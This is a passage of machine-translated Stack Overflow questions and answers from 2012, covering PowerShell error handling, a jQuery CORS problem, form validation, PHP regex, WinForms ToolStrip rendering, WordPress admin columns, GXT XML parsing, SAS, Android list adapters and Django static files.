> 赞同：2
> 
> 时间：2012-11-16T15:25:16.750

似乎没有办法设置：

```
powershell -erroractionpreference stop ... 
```

以下将起作用：

```
powershell -command { $ErrorActionPreference = "stop"; .\test.ps1 } -noprofile 
```

当然没有什么可以阻止脚本（重新）设置 ErrorActionPreference。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T15:04:42.567

把它放在你正在运行的脚本的顶部？

```
$ErrorActionPreference = 'Stop' 
```

或者，您也可以使用 ErrorAction 参数在 cmdlet 级别获得类似的控制。

# backbone.js - 获取主干模型时出错（在 chrome 中有效，但在 firefox 和 ie9 中无效）

> ID：13418711
> 
> 赞同：4
> 
> 时间：2012-11-16T14:36:28.383
> 
> 标签：backbone.js, fetch

我有一项服务可以在 chrome 中返回正确的数据，但在 firefox 和 ie9 中以错误结束。看起来 GET 返回 200 OK 代码，但仍以错误回调结束。我通过backbonejs 获取数据（使用jquery.getJson 和ajax 我得到相同的结果）。如果我尝试从远程服务器或本地获取数据，我也会得到相同的结果。

Chrome：版本 23.0.1271.64 m FF：16.0.2 IE9：9.0.8112.16421

**wcf:**

```
[OperationContract]
[WebInvoke(Method = "GET", UriTemplate = "/getData/{name}", BodyStyle = WebMessageBodyStyle.Wrapped, ResponseFormat = WebMessageFormat.Json)]
List<Names> getData(string name); 
```

**服务网址：**

```
"http://serverABC:4000/myService.svc/getData/test" 
```

**从 javascript 获取：** 通过主干或 jqueryGetJson()：

```
$.getJSON("http://serverABC:4000/myService.svc/getData/test", function () {
      alert("success");
  })
  .success(function () { alert("second success"); })
  .error(function (result) {
      console.log('error:', result);
   }) 
```

**结果：** “http://serverABC:4000/myService.svc/getData/test 200 OK 70ms”

标题：

```
Response Headers
Cache-Control   private
Content-Length  6544
Content-Type    application/json; charset=utf-8
Date    Fri, 16 Nov 2012 14:09:46 GMT
Server  Microsoft-IIS/7.5
Set-Cookie  ASP.NET_SessionId=s3aguluzip0dw135glbxlwwf; path=/; HttpOnly
X-AspNet-Version    4.0.30319
X-Powered-By    ASP.NET
Request Headers
Accept  application/json, text/javascript, */*; q=0.01
Accept-Encoding gzip, deflate
Accept-Language en-US,en;q=0.5
Connection  keep-alive
Host    svgwbip93:4000
Origin  http://localhost:51280
Referer http://localhost:51280/Default.aspx?ReturnUrl=%2f
User-Agent  Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0 
```

调试结果：

```
readyState 0
responseText ""
status 0
**statusText "error"**
abort function()
always function()
complete function()
done function()
error function()
fail function()
getAllResponseHeaders function()
getResponseHeader function()
overrideMimeType function()
pipe function()
progress function()
promise function()
setRequestHeader function()
state function()
statusCode function()
success function()
then function()
toString function() 
```

**响应： - 是空的（这很可能是问题所在（但正如我在 Chrome 中提到的那样，我得到了正确的 json 数据）**

**编辑 1：** 我试图用提琴手得到原始响应，我得到了 JSON。最大的问题是为什么回调会出错。这是我的原始回复：

```
HTTP/1.1 200 OK
Cache-Control: private
Content-Length: 29
Content-Type: application/json; charset=utf-8
Server: Microsoft-IIS/7.5
Set-Cookie: ASP.NET_SessionId=kuv3g0r2dgmu5bpaoayj5lic; path=/; HttpOnly
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Fri, 16 Nov 2012 19:32:58 GMT

{"PlatformDrawingsResult":[]} 
```

我验证了 json - 看起来没问题，所以可能是什么问题....嗯。我忘了提到我也在使用 requirejs （不确定这是否会带来一些亮点，..）

干杯，米罗

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-19T09:17:58.173

解决方案是（感谢**jwkeenan**）：

> 我将这一行放在我的 Web 服务中每个方法的开头，现在所有浏览器都可以工作。

```
HttpContext.Current.Response.AddHeader("Access-Control-Allow-Origin", "*"); 
```

为了让它在 ie9 中工作，我需要将它添加到我的网络应用程序中：

```
$.support.cors = true; 
```

# javascript - javascript验证代码不起作用

> ID：13418715
> 
> 赞同：0
> 
> 时间：2012-11-16T14:36:41.277
> 
> 标签：javascript, html, validation

这似乎是重复的问题，但请看一下并尝试回答。我的 javascript 验证功能不起作用。Javascript代码如下：

```
<script type="text/javascript">

var ck_name = /^[A-Za-z ]{3,20}$/;
   var ck_email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}
  (?:\.  [a-z]{2})?)$/i 

var ck_mobile = /^[0-9]{10}$/;
var ck_address =  /^[A-Za-z0-9-,]{40,100}$/;

function validate(myform){
var name = myform.fullname.value;
var email = myform.email.value;
var mobile = myform.mobile.value;
var address = myform.address.value;

 var errors = [];

if (!ck_name.test(name)) {
  errors[errors.length] = "Enter valid Name .";
  }

  if (!ck_email.test(email)) {
   errors[errors.length] = "You must enter a valid email address.";
  }
 if (!ck_username.test(mobile)) {
  errors[errors.length] = "Enter valid 10 digit mobile number .";
  }

 if (!ck_password.test(address)) {
  errors[errors.length] = "You must enter a valid address min 40 char.";
  }

 if (errors.length > 0) {
  reportErrors(errors);
  return false;
  }

  return true;
 }

 function reportErrors(errors){
 var msg = "Please Enter Valid Data...\n";
 for (var i = 0; i<errors.length; i++) {
  var numError = i + 1;
  msg += "\n" + numError + ". " + errors[i];
  }
  alert(msg);
 }
  </script> 
```

我有两个按钮 1) 提交和 2) 取消，当我单击提交按钮时，验证函数将调用，当我单击取消时，它会返回页面。

HTML 表单

```
<form action="addorder.php" method="post" enctype="multipart/form-data" name="myform"  >

                    <!-- Form -->
                    <div class="form">
                        <?php   
                       if(isset($_SESSION['msg']))
                       {
                       ?> 
                        <div class="msg msg-ok"><strong><?php echo $_SESSION['msg'];?></strong></div>
                    <?php } ?>      
 <label>Full name<span>(Required Field)</span></label>
   <input type="text" name="fullname"class="field size1"/>
   </p>
              <p>

                                <label>Email<span>     (Required Field)</span>
                                <input type="text" class="field size1" name="email"/> 
                                </label>
              </p>  

               <p>

                                <label>Mobile<span>(Required Field)</span>
                                <input type="text" class="field size1" name="mobile"/> 
                                </label>
              </p>

                        <p>

                                <label>Address<span>(Required Field)</span>
                                <textarea  class="field size1" name="address" rows="3" cols="10"> </textarea>
                                </label>
              </p>

                  </div>
            <!-- End Form -->

                    <!-- Form Buttons -->
                    <div class="buttons" >
                      <input type="submit" name="submit" class="button"  value="Submit" onclick="return validate(myform)" />
                      <input type="submit" name="cancel" class="button" value="Cancel" />
                    </div>
                    <!-- End Form Buttons -->
                </form> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:51:13.807

我在 jsfiddle 中尝试了您的代码，但它没有调用`validate`. 删除大部分 javascript 并只留下一个基本的`validate`确实调用 validate。所以我认为你的 javascript 有语法错误，并且表单在提交之前忽略了它。所以：

1.  将取消按钮更改为`type=button`，以便在您要取消提交时它不会默认提交表单。
2.  打开 firebug，或者至少打开 javascript 控制台（在某些浏览器中称为“错误控制台”）并查看您得到的错误。

学习如何调试 javascript 这一次和将来都会有所帮助。如果存在语法错误，浏览器可以完全丢弃 Javascript，在这种情况下，您的表单将像根本没有 javascript 一样提交。

但是，不要将此视为仅通过 javascript 提交的建议，因为这会阻止关闭 javascript 的用户使用您的表单。但是必须取消提交的取消按钮。

# regex - 使用正则表达式提取子字符串

> ID：13418717
> 
> 赞同：-1
> 
> 时间：2012-11-16T14:36:46.080
> 
> 标签：regex

我想从下面的字符串中提取字符串`"t="`，`'&'`但`'&2384'`有时可能不存在。我尝试了以下方法，但得到的结果`"123455asdfgh&2384"`不是`"123455asdfgh"`，我在这里做错了什么？感谢帮助。

```
$string="t=123455asdfgh&2384";
$match=array();

preg_match('/t=(.*)(&.*)?/', $string, $match);

echo $match[1]; 
```

注意：我需要使用常规表达式...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:37:52.763

试试这个

```
preg_match('/t=([^&]*)(&.*)?/', $string, $match); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:40:14.077

尝试一个非贪婪的量词：

```
preg_match('/t=(.*?)(?=&|$)/', $string, $match); 
```

问题是第一个`.*`匹配到字符串末尾的所有内容，这仍然是一个完整的匹配，因为后一组是可选的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:40:29.197

这更适合 [`parse_str()`](http://php.net/parse_str)，而不是正则表达式。

```
parse_str( "t=123455asdfgh&2384", $params);
echo $params['t']; 
```

这[打印](http://3v4l.org/6OceG#v430)：

```
123455asdfgh 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-16T14:41:03.503

这就是`parse_str`（解析查询字符串）的用途：

```
$string="t=123455asdfgh&2384";
$args = array();
parse_str($string, $args);
echo $args['t']; // outputs '123455asdfgh' 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-16T14:42:03.037

使用[`strpos()`](http://www.php.net/manual/en/function.strpos.php)查找字符串中的起点和终点，然后提取呢？

# c# - ToolStrip 圆角

> ID：13418721
> 
> 赞同：11
> 
> 时间：2012-11-16T14:37:00.497
> 
> 标签：c#, winforms, render, toolstrip

我正在开发一个 Windows 窗体应用程序（C#、.NET 4.0、VS 2010），其中我有一个带有 ToolStrip 的非常标准的 MainForm（GripStyle：隐藏，Dock：顶部，RenderMode：ManagerRenderMode）。工具条包含一些基本项（ToolStripLabel、ToolStripSeparator、ToolStripSplitButton）。

这呈现如下：

![默认渲染的 ToolStrip ManagerRenderMode](../Images/ea9c3155a2f81e77f4489f4a53f2d227.png)

起初我只是想在工具条下方添加一个“底部”边框，但我也注意到这个工具条是用“圆角”渲染的（您可以在图像中看到右侧的顶部和底部），并且垂直渐变线。

**我怎样才能使这些角不圆？**

我试过：

```
public class MainFormToolStripRenderer : ToolStripProfessionalRenderer
{
    protected override void OnRenderToolStripBorder(ToolStripRenderEventArgs e)
    {
        base.OnRenderToolStripBorder(e);

        var y = e.ToolStrip.Height-1;
        e.Graphics.DrawLine(new Pen(SystemColors.ControlDark, 1), new Point(0, y), new Point(e.ToolStrip.Width, y));
    } 
```

`this.toolStrip_Actions.Renderer=new MainFormToolStripRenderer();`并通过我的表单初始化将其连接起来。

这给了我底部边框，但对圆角没有做任何事情。此外，通过添加底部边框，圆角更加明显：

![由自定义 ToolStripProfessionalRenderer 渲染的 ToolStrip](../Images/46d5342a9fd29b549dfee58bf1ea6d77.png)

接下来，我尝试在上面的同一事件处理程序中绘制一个矩形，以尝试（至少）将圆角和垂直渐变隐藏在实心矩形边框后面。这不起作用，因为可用的绘图区域（e.AffectedBounds）在圆形边框内。

我还尝试将 ToolStrip 的 RenderMode 设置为 System（而不是使用我的渲染器）。在这种情况下，工具条的角落似乎很贴合（矩形），但工具栏中的拆分按钮似乎已损坏（单击向下箭头不显示下拉菜单），原因尚不清楚，整体外观-n -feel 有点令人印象深刻（非常平淡，直到您将鼠标悬停在工具条中的某些按钮上）。

我想最后我宁愿坚持使用 ManageeRenderedMode，或者从 Professional 继承的自定义渲染器 - 但我需要摆脱圆角。其中，我发现[这个 SO Q](https://stackoverflow.com/q/8527585/27826)似乎与我正在查看的内容接近，但没有为我的案例提供答案。

提前致谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-16T14:44:22.717

在你的渲染器类中试试这个：

```
public class MainFormToolStripRenderer : ToolStripProfessionalRenderer {

  public MainFormToolStripRenderer() {
    this.RoundedEdges = false;
  }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-05-23T14:21:36.907

正如 am05mhz 提到的，只需选择*RenderMode > System*，圆角就会消失：

![](../Images/9a76aeea18fda1eb781626fe301dc66a.png)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-02-01T14:03:45.157

在[LarsTech](https://stackoverflow.com/users/719186/larstech)[接受的答案](https://stackoverflow.com/a/13418840/1150698)的基础上，您不一定需要实现新的 Renderer 类，除非有令人信服的理由这样做。

您可以按以下方式将其作为一个衬垫执行：

```
toolStrip_Actions.Renderer = new ToolStripProfessionalRenderer() { RoundedEdges = false }; 
```

或者由于将 RenderMode 设置为 ManagerRenderMode 的 ToolStrip 的默认渲染器已经是 ToolStripProfessionalRenderer，您可以将其转换为这样并直接访问 RoundedEdges 属性，如下所示：

```
((ToolStripProfessionalRenderer)toolStrip_Actions.Renderer).RoundedEdges = false; 
```

# wordpress - 从“帖子标题”下方移动自定义列管理链接

> ID：13418722
> 
> 赞同：5
> 
> 时间：2012-11-16T14:37:01.267
> 
> 标签：wordpress

似乎我无法弄清楚如何将编辑、删除、查看等添加到我在 wordpress 后端的自定义列之一。这个想法是在将鼠标悬停在标题上时获取附加到标题的链接，以附加到不同的列。

这是以下代码输出的内容。 ![](../Images/a5033948b1388962c7c7a4aa04d4544a.png)

这就是我希望将鼠标悬停在作者上时作者列中的链接所具有的内容，就像将鼠标悬停在此屏幕截图中的标题上一样；所有的编辑链接。 ![](../Images/1466c8a06241bfa60f136e68ed42860f.png)

这是我到目前为止所拥有的：

```
add_filter( 'manage_edit-testimonial-quotes_columns', 'view_columns' ) ;
function view_columns( $columns ) {
  $columns = array(
    'cb' => '',
    'date' => __( 'Date' ),
    'tq_author' => __( 'Author' ),
    'tq_quote' => __( 'Testimonial' ),
  );
  return $columns;
}
add_action('manage_testimonial-quotes_posts_custom_column', 'custom_view_columns', 10, 2);
function custom_view_columns($column, $post_id){
global $post;
  switch ($column){
  case 'tq_author':
    echo '<a href="post.php?post=' . $post->ID . '&action=edit">';
    $column_content = the_field('tq_author');
    echo $column_content;
    echo '</a>';
    break;
  case 'tq_quote':
    $column_content = the_field('tq_quote');
    echo $column_content;
    break;
  default:
    break;
  }
} 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2017-02-21T00:42:23.340

自 WP 4.3.0 以来最好的方法是使用

```
add_filter( 'list_table_primary_column', [ $this, 'list_table_primary_column' ], 10, 2 );

public function list_table_primary_column( $default, $screen ) {
    if ( 'edit-yourpostype' === $screen ) {
        $default = 'yourcolumn';
    }
    return $default;
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-01T19:16:55.917

我**真的怀疑**有一个钩子来处理这个问题。所以，我什至不会检查核心并直接进入肮脏的解决方案：

```
add_action( 'admin_head-edit.php', 'so_13418722_move_quick_edit_links' );

function so_13418722_move_quick_edit_links()
{
    global $current_screen;
    if( 'post' != $current_screen->post_type )
        return;

    if( current_user_can( 'delete_plugins' ) )
    {
        ?>
        <script type="text/javascript">
        function so_13418722_doMove()
        {
            jQuery('td.post-title.page-title.column-title div.row-actions').each(function() {
                var $list = jQuery(this);
                var $firstChecked = $list.parent().parent().find('td.author.column-author');

                if ( !$firstChecked.html() )
                    return;

                $list.appendTo($firstChecked);
            }); 
        }
        jQuery(document).ready(function ($){
            so_13418722_doMove();
        });
        </script>
        <?php
    }
} 
```

**结果**：
![移动快速编辑](../Images/d3ec4c87e45352878bf6727c2ec794b2.png)

**备注**：

*   **调整**你的 post_type：`'post' != $current_screen->post_type`
*   **调整**你的列类：`find('td.author.column-author')`

**Bug 和解决方案**：
您会注意到，更新后，快速编辑菜单会回到原来的位置。下面的 AJAX 拦截处理它。有关更多详细信息，请参阅此[WordPress 开发人员答案](https://wordpress.stackexchange.com/a/74595/12615)。

```
add_action( 'wp_ajax_inline-save', 'so_13418722_ajax_inline_save' , 0 );

/**
 Copy of the function wp_ajax_inline_save()
 http://core.trac.wordpress.org/browser/tags/3.4.2/wp-admin/includes/ajax-actions.php#L1315

 Only Modification marked at the end of the function with INTERCEPT
*/
function so_13418722_ajax_inline_save()
{
    global $wp_list_table;

    check_ajax_referer( 'inlineeditnonce', '_inline_edit' );

    if ( ! isset($_POST['post_ID']) || ! ( $post_ID = (int) $_POST['post_ID'] ) )
        wp_die();

    if ( 'page' == $_POST['post_type'] ) {
        if ( ! current_user_can( 'edit_page', $post_ID ) )
            wp_die( __( 'You are not allowed to edit this page.' ) );
    } else {
        if ( ! current_user_can( 'edit_post', $post_ID ) )
            wp_die( __( 'You are not allowed to edit this post.' ) );
    }

    set_current_screen( $_POST['screen'] );

    if ( $last = wp_check_post_lock( $post_ID ) ) {
        $last_user = get_userdata( $last );
        $last_user_name = $last_user ? $last_user->display_name : __( 'Someone' );
        printf( $_POST['post_type'] == 'page' ? __( 'Saving is disabled: %s is currently editing this page.' ) : __( 'Saving is disabled: %s is currently editing this post.' ),    esc_html( $last_user_name ) );
        wp_die();
    }

    $data = &$_POST;

    $post = get_post( $post_ID, ARRAY_A );
    $post = add_magic_quotes($post); //since it is from db

    $data['content'] = $post['post_content'];
    $data['excerpt'] = $post['post_excerpt'];

    // rename
    $data['user_ID'] = $GLOBALS['user_ID'];

    if ( isset($data['post_parent']) )
        $data['parent_id'] = $data['post_parent'];

    // status
    if ( isset($data['keep_private']) && 'private' == $data['keep_private'] )
        $data['post_status'] = 'private';
    else
        $data['post_status'] = $data['_status'];

    if ( empty($data['comment_status']) )
        $data['comment_status'] = 'closed';
    if ( empty($data['ping_status']) )
        $data['ping_status'] = 'closed';

    // update the post
    edit_post();

    $wp_list_table = _get_list_table('WP_Posts_List_Table');

    $mode = $_POST['post_view'];
    $wp_list_table->display_rows( array( get_post( $_POST['post_ID'] ) ) );

    // INTERCEPT: Check if it is our post_type, if not, do nothing  
    if( 'post' == $_POST['post_type'] )
    {
    ?>
        <script type="text/javascript">so_13418722_doMove();</script>
    <?php       
    }
    // end INTERCEPT    

    wp_die();

} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-01-11T20:41:30.020

我也有同样的需要。

[Nicola 的解决方案](https://stackoverflow.com/a/42356703/941410)对我有用，但我收到“未定义变量”通知/错误。然后我意识到参数必须没有“[$this ...]”部分。

我猜那是文档的复制/粘贴。

所以这有效：

```
add_filter( 'list_table_primary_column', 'list_table_primary_column', 10, 2 );
function list_table_primary_column( $default, $screen ) {
    if ( 'edit-your_post_type' === $screen ) {
        // Set default columns to Minutes Spent.
        $default = 'your_column';
    }
    return $default;
} 
```

如果您不知道 your_column 是什么，只需检查该列的标题并获取 ID。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-05-04T07:45:33.103

就像公认的答案一样，如果不求助于 JS，就无法移动动作本身。但是，您可以使用 php 和内置的 Wordpress 函数非常轻松地构建自己的操作弹出版本。即使用户关闭了 JS，这个版本也可以工作。

假设您使用开关来填充自定义列，如果不适应您自己的功能，请执行以下操作：

```
switch ( $column ) {
    case 'your_column_name':
        echo "Your custom content here"; 
        my_custom_column_actions($post_id);
        break;
} 
```

然后有一个单独的函数来重新创建操作弹出窗口。

```
function my_custom_column_actions($post_id) {
        if($_GET['post_status']!='trash') :
            $bare_url = "/wp-admin/post.php?post=$post_id&amp;action=trash";
            $nonce_url = wp_nonce_url( $bare_url, 'trash-post_'.$post_id );
            echo "  <div class='row-actions'>
                        <span class='edit'>
                            <a href='/wp-admin/post.php?post=$post_id&amp;action=edit'>Edit</a> | 
                        </span>
                        <span class='trash'>
                            <a href='$nonce_url' class='submitdelete'>Trash</a>
                        </span>
                        <span class='edit'>
                            <a href='".get_the_permalink($post_id)."'>View</a> | 
                        </span>
                    </div>";
        else: 
            $bare_url = "/wp-admin/post.php?post=$post_id&amp;action=untrash";
            $nonce_url = wp_nonce_url( $bare_url, 'untrash-post_'.$post_id );
            $delete_url = "/wp-admin/post.php?post=$post_id&amp;action=delete";
            $nonce_delete_url = wp_nonce_url( $delete_url, 'delete-post_'.$post_id );
            echo "  <div class='row-actions'>
                        <span class='untrash'>
                            <a href='$nonce_url' class='untrash'>Restore</a> | 
                        </span>
                        <span class='delete'>
                            <a href='$nonce_delete_url' class='submitdelete'>Delete Permanently</a>
                        </span>
                    </div>";
        endif;
    } 
```

所有带有`nonce_url`s 的业务对于回收、恢复或删除都很重要；没有它，这些操作将无法进行。

如果您想将其包含在通常会出现的列中，例如作者或发布日期，则在声明自定义列时不需要包含标准列，而是包含获取相同数据的自定义列（加上对上述函数的调用）。

如果您想包含标题但不让动作出现在它下面，这也是如此 - 否则它们会出现两次。不要包含该`title`列，而是包含您自己的获取标题但*不*包含新功能的自定义列。

您还可以通过编辑功能回显的内容来非常轻松地添加自己的操作。

# xml - 当根节点有命名空间声明时，GXT 和 AutoBeans 能否处理 XML？

> ID：13418728
> 
> 赞同：0
> 
> 时间：2012-11-16T14:37:35.993
> 
> 标签：xml, parsing, namespaces, gxt, autobean

我尝试使用 GXT 和 AutoBeans 解析一条 XML 消息。我的 XML 的根节点有一个命名空间声明，并且 AutoBean 解析器似乎无法读取 XML。

我使用 PropertyName 规范设置了 AutoBean 对象图的根：

```
@PropertyName("record")
RecordObject getRecord(); 
```

但是当我的 XML 看起来像这样时：

```
<record xmlnms:ab="http://anynamespace.com">
<ab:name>SampleName</ab:name>
<ab:email>sample@email.com</ab:email>
</record> 
```

AutoBean 似乎无法解码 XML。如果命名空间声明不存在，AutoBean 可以找到根记录对象。是否有其他参数或我可以指定的东西来告诉 AutoBean 只查看元素名称？

**我试过的**

我尝试在剥离命名空间的情况下进行解析，它可以工作，但在我的实际用例中，我无法删除命名空间声明。我也尝试在`@PropertyName`属性中指定命名空间`@PropertyName("record xmlnms:ab=\"http://anynamespace.com\"")`- 但这不起作用（我也不希望它这样做）。

**编辑**

我正在使用 GXT 的 XmlReader 来尝试解析 XML。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T17:29:47.243

GXT 的 XmlReader 位于浏览器本身的内置 XML 解析器之上。它使用`com.google.gwt.xml.XML`GWT 中的模块在所有浏览器中获得对 XML 节点的相对一致的访问，而不是构建自己的 XML 解析器。通过在浏览器中使用内置实现，GXT 可以访问本机解析器——事实证明，浏览器非常擅长解析 XML，因为它们整天都在做这些事情，加载网页。

然后，GXT 有自己的查询引擎来查找节点，使用 XPath 和 CSS3 组合的查询语言。这种混合是为了让它能够很好地在 html 本身中查找节点，以及在 xml 文档中查找节点。这被设计成一致的

但是，浏览器对命名空间的支持不一致（我在看你，IE），所以 GWT 中的 XML 模块不知道如何谈论命名空间，DomQuery 引擎也不知道。此外，`:`在 XML 中表示“命名空间”的运算符在 CSS 中用于表示“伪选择器”，因此如果直接支持该查询语言，则查询语言会有点模糊：字符串`foo:bar`可能表示“所有具有名称的元素`foo`匹配 psuedo-selector `bar`”，或“`bar`命名空间中具有名称的所有元素`foo`”。

问题就够了：解决方案是什么？目前，IE6/IE7/IE8 中的命名空间元素还没有一个好的方法——一方面是浏览器中的不一致，另一方面是 GXT 中缺乏丑陋的解决方法，这意味着您无法直接读出元素。对于所有其他浏览器，要选择类似 的元素`namespace:eltname`，只需使用`@PropertyName("eltname")`.

另一个注意事项：由于属性没有伪选择器，您*可以*选择它们 -`@PropertyName("namespace:attrname")`将正确读取`<element namespace:attrname="value">`.

# sas - 获取正在运行的 SAS 程序的名称

> ID：13418729
> 
> 赞同：2
> 
> 时间：2012-11-16T14:37:36.407
> 
> 标签：sas, sas-macro

是否有任何通用建议来识别正在执行的 SAS 代码/程序？

我的代码将在通用宏中执行，因此可以在存储过程、另一个宏、客户端 SAS 程序甚至是使用 IOM 通过中间层生成的 SAS 代码中调用。我想要可能的最高级别标识符..（如果再次运行相同的程序会返回相同结果的东西 - 所以进程 ID 不会有帮助）。

环境不是windows，所以这段代码没有帮助：

```
%put %sysget(SAS_EXECFILENAME); 
```

此外，宏不一定是第一个被调用的程序（如果它甚至是一个程序） - 所以这段代码也没有帮助：

```
proc sql noprint;
select xpath into :progname
from sashelp.vextfl where upcase(xpath) like '%.SAS';
%put &progname; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T22:11:54.140

It sounds to me like you may need to think through how this is to be be used a little more. What if the same user has two sessions open running the same code? Should that use the same file name?

Can you simply make it a requirement of your piece of code that a certain variable must have been specified before your code will run? Otherwise return an error / abort further processing?

To answer your original question though I don't think this is possible.

# android - 如何使用来自网络的文本框和图像视图制作自定义列表适配器？

> ID：13418735
> 
> 赞同：0
> 
> 时间：2012-11-16T14:37:55.127
> 
> 标签：android, listview, hashmap, android-imageview, listadapter

我正在使用通过 AsyncTask 运行的参数化 Uri 链接来获取（GET）一些信息，只要用户在 TextBox 中提供一些信息并点击按钮启动任务。

我得到响应并将该信息作为 JSONObject 插入，并将其放入包含三个字段、全名、用户名和 PhotoByte 的 HashMap 的 ArrayList 中。

我想要的是为 ListView 制作一个自定义适配器以显示该信息。我知道如何将 decodeByteArray 解码为 Bitmap 并将其设置为 ImageView，但在某处我正在苦苦挣扎。

我按照本[教程学习](http://www.androidhive.info/2012/02/android-custom-listview-with-image-and-text/)了如何制作一个好的自定义适配器...但是我不需要实例化 HttpConnections 也不需要从 url 加载图像，而是需要转换从 url 给出的 byteArray 并将其显示在该自定义适配器的 ListView 项中的 ImageView。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:57:04.167

是的，使用自定义适配器，在其中你可以做任何你喜欢的事情；）这里有一些代码，但你也许应该看看其他例子来弄清楚适配器是如何工作的。

```
>      public class Adapter_Custom extends BaseAdapter {
>         
>           // DEBUG
>           private final String TAG = this.getClass().getSimpleName();
>         
>           // Layout
>           private LayoutInflater inflater = null;
>           public ViewHolder holder;
>           View vi;
>         
>           Context context;
>           private ArrayList<Item_Pin> pinItems;
>         
>           public Adapter_Custom(Context context, ArrayList<Item_Pin> pinItems) {
>               this.context    = context;
>               this.pinItems   = pinItems;
>               
>               inflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
>           }
>         
>           // Used internally by this class
>           public int getCount() {
>               return pinItems.size();
>           }
>           
>           // 
>           @Override
>           public long getItemId(int position) {
>               // Return whatever u like here
>               return 0;
>           }
>         
>           @Override
>           public String getItem(int position) {
>               return "You can return whatever u like here";
>           }
>         
>           public View getView(int position, View convertView, ViewGroup parent) {
>         
>               vi = convertView;
>          // If there is no ViewHolder already, create a new one
>               if(convertView  ==  null){
>                   vi = inflater.inflate(R.layout.your_xml_file, null);
>                   holder = new ViewHolder();
>         
>                   holder.title        = (TextView)vi.findViewById(R.id.your_xml_file_textview);
>                   holder.background   = (LinearLayout)vi.findViewById(R.id.your_xml_file_linearlayout);
>         
>                   vi.setTag(holder);
>                   holder = (ViewHolder)vi.getTag(); // If there already is a viewholder, reuse it!                 
} else {
>                   holder = (ViewHolder)vi.getTag();
>               }
>          // This is where you place code for every list item - this is where you convert your base64 to images.
>               holder.title.setText(pinItems.get(position).getPinText());
>               // here you could also set the background of holder.background to your base64 image.
>         
>               return vi;
>           }
>         
>           //XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
>           // VIEWHOLDER - This is the code part of your XML
>           //XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
>           public class ViewHolder{
>         
>               public TextView title;
>               public LinearLayout background;
>         
>           }
>         } 
```

使用该代码并将其替换为您自己的 XML 文件和数据，然后只需将代码放入 getView() 方法中，该方法将您的字节数组转换为每个列表项的图像。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:51:56.983

您需要构建一个 .xml 文件，例如 row.xml，您可以在其中设置您喜欢的 TextViews 和 ImageViews（和 Buttons）。

您还需要构建自定义适配器，就像此处的链接所示：

[http://www.ezzylearning.com/tutorial.aspx?tid=1763429](http://www.ezzylearning.com/tutorial.aspx?tid=1763429)

我发现这是最好和最简单的自定义 listadapter 教程之一。

此外，值得一提的是，建议进行一些优化，因为列表视图很可能会很慢，并且在功能较弱的设备上不活泼。

# django - 如何提供静态/管理员/而不仅仅是静态/css？

> ID：13418737
> 
> 赞同：3
> 
> 时间：2012-11-16T14:38:02.160
> 
> 标签：django, django-admin

完成后，`python manage.py collectstatic`我发现我可以访问所有内容，`static/css`但不能访问`static/admin`. 要非常清楚：

1.  我去： http: [//mysite.com/static/admin/css/login.css](http://mysite.com/static/admin/css/login.css)并失败
2.  手动将文件夹移动`static/admin`到`static/css`
3.  我去： http: [//mysite.com/static/css/admin/css/login.css](http://mysite.com/static/css/admin/css/login.css)并且工作！

注意URLS 中从**/static/admin/css/**到**/static/css/admin/css/的变化。**这意味着这并不能解决问题，因为模板继续指向第一个 URL。

我知道，在 stackoverflow 中**提供静态管理文件**已被询问了 100 次，但我仍然无法使其工作（而且我并不孤单地阅读我所阅读的评论）。似乎没有人提到访问`static/css`文件夹和`static/anyother_folder`.

**一些额外的细节：**

没有错误，`collectstatic`应用程序css没有问题。这就是我的`settings.py`）：

```
MEDIA_ROOT = join(PROJECT_ROOT,'../media')
MEDIA_URL = '/media/'
STATIC_ROOT = join(PROJECT_ROOT,'../static')
STATIC_URL = '/static/' 
```

我也尝试过**不推荐使用** `ADMIN_MEDIA_PREFIX`的方法，但没有任何结果。

```
ADMIN_MEDIA_PREFIX = '/static/admin/' 
```

我的 nginx 配置简单明了。

```
location /static {
    alias /home/the_home/where_the_static_is/static/;
}
location /media {
    alias /home/the_home/where_the_media_is/media/;
} 
```

我正在使用最新版本的 Django (1.4.2)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T18:19:30.990

噗。所以，就在这里。我在 nginx 中有另一个文件夹，将 /static/admin/ 重定向到虚拟环境中的 Django 安装。在组织中，我们使用预先配置我们的 Django 项目的虚拟机模板。所以，重新访问 nginx 配置我发现了这个：

```
location /static/admin {
   alias /path/to/virtualenvs/my_virtualenv/path_to_the_static_admin;
} 
```

显然这适用于 Django 1.3，但路径在某些时候发生了变化。

# php - 配置 ZF2 view_manager 加载 2 个单独的模板地图

> ID：13418739
> 
> 赞同：3
> 
> 时间：2012-11-16T14:38:09.377
> 
> 标签：php, zend-framework2, zend-framework-modules

